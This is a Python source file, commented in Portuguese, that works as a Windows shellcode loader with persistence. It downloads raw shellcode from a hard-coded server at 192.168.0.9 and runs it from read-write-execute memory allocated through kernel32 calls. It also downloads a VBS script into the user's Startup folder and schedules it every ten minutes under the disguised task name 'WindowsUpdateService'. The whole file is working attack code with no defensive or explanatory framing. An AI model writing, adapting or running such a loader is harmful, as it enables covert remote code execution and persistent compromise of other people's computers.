import ctypes
import threading
from ctypes import wintypes
import urllib.request
import os
import subprocess
import sys

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

def DownloadShellcode():
    try:
        SHELLCODE_URL = "http://192.168.0.9:8080/teste.bin"
        print(f"Baixando shellcode de {SHELLCODE_URL}...")
        
        # Adicionar headers para evitar possÃ­veis bloqueios
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        request = urllib.request.Request(SHELLCODE_URL, headers=headers)
        
        with urllib.request.urlopen(request, timeout=30) as response:
            buf = response.read()
            print(f"Shellcode baixado com sucesso! Tamanho: {len(buf)} bytes")
            return buf
            
    except Exception as e:
        print(f"ERRO: Falha ao baixar shellcode: {e}")
        return None

def DownloadAndSchedule():
    try:
        # Download do arquivo run.vbs para o diretÃ³rio de inicializaÃ§Ã£o do usuÃ¡rio
        vbs_url = "http://192.168.0.9:8080/run.vbs"
        
        # Obter o diretÃ³rio de inicializaÃ§Ã£o do usuÃ¡rio atual
        startup_dir = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_path = os.path.join(startup_dir, "run.vbs")
        
        # Verificar se o diretÃ³rio existe, se nÃ£o, criar
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir)
        
        print(f"Baixando run.vbs de {vbs_url}...")
        
        # Adicionar headers para o download do VBS
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        request = urllib.request.Request(vbs_url, headers=headers)
        
        with urllib.request.urlopen(request, timeout=30) as response:
            vbs_content = response.read()
        
        print(f"Salvando em {startup_path}...")
        with open(startup_path, 'wb') as f:
            f.write(vbs_content)
        
        # Verificar se o arquivo foi salvo
        if os.path.exists(startup_path):
            print("Arquivo run.vbs baixado com sucesso para o diretÃ³rio de inicializaÃ§Ã£o do usuÃ¡rio!")
        else:
            print("Falha ao salvar o arquivo run.vbs")
            return False
        
        # Criar tarefa agendada apontando para o diretÃ³rio do usuÃ¡rio
        cmd_command = f'schtasks /create /tn "WindowsUpdateService" /tr "wscript.exe \\"{startup_path}\\"" /sc minute /mo 10 /f'
        print("Criando tarefa agendada...")
        result = subprocess.run(cmd_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("Tarefa agendada criada com sucesso!")
            return True
        else:
            print(f"Erro ao criar tarefa: {result.stderr}")
            return False
        
    except Exception as e:
        print(f"Erro no download ou agendamento: {e}")
        return False

def ThreadFunction(buf):
    if buf is None:
        print("ERRO: Shellcode nÃ£o disponÃ­vel para execuÃ§Ã£o")
        return 0
        
    try:
        # Define functions from kernel32.dll
        kernel32 = ctypes.windll.kernel32
        kernel32.GetCurrentProcess.restype = wintypes.HANDLE
        kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        kernel32.VirtualAllocEx.restype = wintypes.LPVOID
        kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        kernel32.WriteProcessMemory.restype = wintypes.BOOL

        current_process = kernel32.GetCurrentProcess()

        # Allocate memory with `VirtualAllocEx`
        sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        
        if not sc_memory:
            print("ERRO: Falha ao alocar memÃ³ria")
            return 0
            
        bytes_written = ctypes.c_size_t(0)

        # Copy raw shellcode with `WriteProcessMemory`
        success = kernel32.WriteProcessMemory(current_process, sc_memory, ctypes.c_char_p(buf), len(buf), ctypes.byref(bytes_written))
        
        if not success:
            print("ERRO: Falha ao escrever na memÃ³ria")
            return 0

        print("Executando shellcode...")
        # Execute shellcode in memory by casting the address to a function pointer with `CFUNCTYPE`
        shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
        shell_func()

        return 1
        
    except Exception as e:
        print(f"ERRO na execuÃ§Ã£o do shellcode: {e}")
        return 0

def Run(buf):
    if buf is None:
        print("NÃ£o foi possÃ­vel executar o shellcode - arquivo nÃ£o disponÃ­vel")
        return
        
    thread = threading.Thread(target=ThreadFunction, args=(buf,))
    thread.start()
    print("Thread de execuÃ§Ã£o do shellcode iniciada")

if __name__ == "__main__":
    print("Iniciando processo...")
    
    # Primeiro baixa o shellcode
    buf = DownloadShellcode()
    
    # Depois executa as outras funÃ§Ãµes
    if buf is not None:
        DownloadAndSchedule()
        Run(buf)
    else:
        print("Processo interrompido devido Ã  falha no download do shellcode")